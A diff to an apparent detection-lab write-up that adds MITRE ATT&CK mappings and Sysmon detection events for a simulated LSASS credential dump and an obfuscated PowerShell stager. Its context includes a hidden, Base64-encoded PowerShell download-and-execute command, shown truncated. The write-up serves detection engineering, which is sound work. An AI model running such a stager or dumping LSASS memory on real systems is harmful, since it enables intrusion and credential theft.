@@ -190,6 +190,11 @@ To simulate credential harvesting and LSASS memory access anomalies, a localized
 2. Execute a simulated pull or run of a Mimikatz binary or memory dump variant designed to trigger read requests against `lsass.exe`.
 3. **Telemetry Reaction:** Sysmon instantly generates a critical **Event ID 10 (ProcessAccess)** showing an abnormal access request targeting LSASS from an untrusted binary, along with **Event ID 1 (Process Creation)** signatures.
 
+**MITRE ATT&CK Mapping**
+- Tactic: Credential Access (TA0006)
+- Technique: OS Credential Dumping — LSASS Memory (T1003.001)
+- Detection: Sysmon Event ID 10 (ProcessAccess targeting lsass.exe)
+
 ### Execution Target 2: Malicious PowerShell Stager Payload
 To simulate initial access payloads or command-and-control (C2) persistence tradecraft, an obfuscated Base64 stager connection was triggered:
 
@@ -201,6 +206,10 @@ powershell.exe -nop -w hidden -enc aWV4IChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd
 
 2. **Telemetry Reaction:** Sysmon generates **Event ID 1** tracking the hidden executable parameters and **Event ID 3 (Network Connection)** mapping the dynamic socket drop to an outbound IP segment.
 
+**MITRE ATT&CK Mapping**
+- Tactic: Execution (TA0002), Defense Evasion (TA0005)
+- Technique: Command and Scripting Interpreter — PowerShell (T1059.001), Obfuscated Files or Information (T1027)
+- Detection: Sysmon Event ID 1 (encoded command parameter), Event ID 3 (outbound C2 connection)
 ---
 
 ## 📊 Verification Lifecycle Proof
